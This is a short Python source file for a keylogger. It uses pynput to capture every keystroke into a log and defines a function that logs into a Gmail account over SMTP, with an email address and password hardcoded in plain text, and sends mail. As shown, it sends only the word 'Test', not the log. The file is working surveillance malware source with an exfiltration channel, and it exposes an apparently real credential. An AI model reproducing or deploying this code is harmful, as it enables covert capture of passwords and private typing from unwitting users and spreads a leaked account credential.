import pynput.keyboard
import smtplib

# creating a listener object and a call back function

log = ""


# within the callback function, the on press method will forward the keys that are being pressed
def callback_function(key):
    global log
    try:
        log = log + key.char
        # log = log + str(key)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    # print(log)


# creating smtp instance to connect to the gmail
def send_mail():
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login("ndunguaus@gmail.com", "aq9agm11")
    email_server.sendmail("ndunguaus@gmail.com", "ndunguaus@gmail.com", "Test")
    email_server.quit()


send_mail()
# 587 is the port for gmail, smtp.gmail.com is the address of our email address


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()  # starts the listener
